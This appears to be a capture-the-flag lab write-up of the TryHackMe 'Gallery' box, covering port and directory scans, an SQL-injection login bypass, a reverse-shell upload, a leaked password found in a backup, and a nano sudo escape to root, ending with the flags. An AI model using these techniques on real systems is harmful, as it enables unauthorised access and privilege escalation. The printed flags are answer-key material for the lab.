# Box Name
## Gallery
---

## Overview
###  Try to exploit our image gallery system
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
### nmap

```
rustscan -r 1-65535 -a 10.10.88.236 --ulimit 9000 -- -sCV -oN nmap/initial.md
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 9000.
Open 10.10.88.236:80
Open 10.10.88.236:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 14:03 UTC

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
8080/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Simple Image Gallery System
|_http-favicon: Unknown favicon MD5: 8F912FAE8063C22A96FB7D08542101BF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```

### ferox scan port 80

```
ferox -u http://10.10.88.236 -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt -t 100 -x html,txt,php -C 403 -o logs/ferox.md

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.88.236
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/raft-small-words.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
200      375l      964w    10918c http://10.10.88.236/
301        9l       28w      314c http://10.10.88.236/gallery
301        9l       28w      319c http://10.10.88.236/gallery/user
200      375l      964w    10918c http://10.10.88.236/index.html
200      348l      904w        0c http://10.10.88.236/gallery/
301        9l       28w      322c http://10.10.88.236/gallery/uploads
301        9l       28w      320c http://10.10.88.236/gallery/build
301        9l       28w      321c http://10.10.88.236/gallery/report
200        0l        0w        0c http://10.10.88.236/gallery/initialize.php
```

- ## web port 8080
	- /gallery/login.php
	![[Pasted image 20220307142505.png]]

	- ### used sqli to log in as admin
		- ####  Username: admin' and 2=2 #
		   ##### Password: admin
	- 	   ![[Pasted image 20220307142812.png]]


## Initial Foothold
---
- ## upload reverse shell at /gallery/?page=albums/images&id=1 (Avatars)Initial Foothold Notes
- ## on the box as www-data
	- ### enumeration
	- # linpeas

```
╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)

-rwxr-xr-x 1 root root 3772 May 24  2021 /var/backups/mike_home_backup/.bashrc
-rwxr-xr-x 1 root root 135 May 24  2021 /var/backups/mike_home_backup/.bash_history
-rwxr-xr-x 1 root root 220 May 24  2021 /var/backups/mike_home_backup/.bash_logout
-rwxr-xr-x 1 root root 20549 May 24  2021 /var/backups/mike_home_backup/images/23-04.jpg
-rwxr-xr-x 1 root root 159262 May 24  2021 /var/backups/mike_home_backup/images/my-cat.jpg
-rwxr-xr-x 1 root root 436526 May 24  2021 /var/backups/mike_home_backup/images/26-04.jpg
-rwxr-xr-x 1 root root 103 May 24  2021 /var/backups/mike_home_backup/documents/accounts.txt
-rwxr-xr-x 1 root root 807 May 24  2021 /var/backups/mike_home_backup/.profile


```

- ### found Mike's password in /var/backups$ cat mike_home_backup/.bash_history
	- #### Mike's password: b3stpassw0rdbr0xx

---
## Privilege Escalation
----
- # su to mike
```bash
www-data@gallery:/home/mike$ su mike
Password: 
mike@gallery:~$ ls -la
total 44
drwxr-xr-x 6 mike mike 4096 Aug 25  2021 .
drwxr-xr-x 4 root root 4096 May 20  2021 ..
-rw------- 1 mike mike  135 May 24  2021 .bash_history
-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike 3772 May 20  2021 .bashrc
drwx------ 2 mike mike 4096 May 24  2021 documents
drwx------ 3 mike mike 4096 May 20  2021 .gnupg
drwx------ 2 mike mike 4096 May 24  2021 images
drwxrwxr-x 3 mike mike 4096 Aug 25  2021 .local
-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
-rwx------ 1 mike mike   32 May 14  2021 user.txt

```

- ## sudo -l 
```bash
mike@gallery:/tmp$ sudo -l 
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

```

- ## cat /opt/rootkit.sh
```bash
mike@gallery:/tmp$ cat /opt/rootkit.sh 
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

- # root
	- ## GTFObins [[gtfobins]]
	- ### nano
	-  ![[Pasted image 20220307153631.png]]
	- sudo /bin/bash /opt/rootkit.sh 
	- drops you into nano running as root
	-  type    ^r^x
					reset; bash 1>&0 2>&0
	- then you will get a root#  prompt

```bash
root@gallery:/tmp# cat /root/root.txt
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
root@gallery:/tmp# cat /home/mike/user.txt
THM{af05cd30bfed67849befd546ef}
```